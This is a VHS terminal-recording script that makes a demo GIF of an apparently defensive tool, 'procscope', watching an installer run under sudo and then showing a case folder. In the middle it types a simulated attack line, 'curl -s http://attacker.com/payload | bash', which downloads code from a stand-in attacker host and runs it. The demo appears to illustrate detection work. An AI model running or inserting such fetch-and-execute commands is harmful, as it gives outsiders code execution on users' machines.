# VHS documentation
#
# Output:
#   Output <path>.gif               Create a GIF output at the given <path>
#   Output <path>.mp4               Create an MP4 output at the given <path>
#   Output <path>.webm              Create a WebM output at the given <path>
#
# Settings:
#   Set FontSize <number>           Set the font size of the terminal
#   Set FontFamily <string>         Set the font family of the terminal
#   Set Height <number>             Set the height of the terminal
#   Set Width <number>              Set the width of the terminal
#   Set LetterSpacing <float>       Set the font letter spacing (tracking)
#   Set LineHeight <float>          Set the font line height
#   Set Theme <string>              Set the theme of the terminal (JSON)
#   Set Padding <number>            Set the padding of the terminal
#   Set Framerate <number>          Set the framerate of the recording
#   Set PlaybackSpeed <float>       Set the playback speed of the recording

Output assets/demo.gif

Set FontSize 16
Set Width 1200
Set Height 600
Set Theme "Dracula"
Set Padding 20
Set WindowBar Colorful
Set MarginFiller "#101010"

Hide
Type "clear"
Enter
Show

Type "sudo procscope -- ./installer.sh"
Sleep 1s
Enter

Sleep 500ms
Type "Starting installation..."
Enter
Sleep 1s
Type "Extraction complete."
Enter
Sleep 2.5s

Type "curl -s http://attacker.com/payload | bash"
Enter
Sleep 1.5s
Type "Payload executed."
Enter
Sleep 2s

Ctrl+C
Sleep 1s

Type "ls -la case-001/"
Enter
Sleep 2s

Type "cat case-001/summary.md"
Enter
Sleep 3s
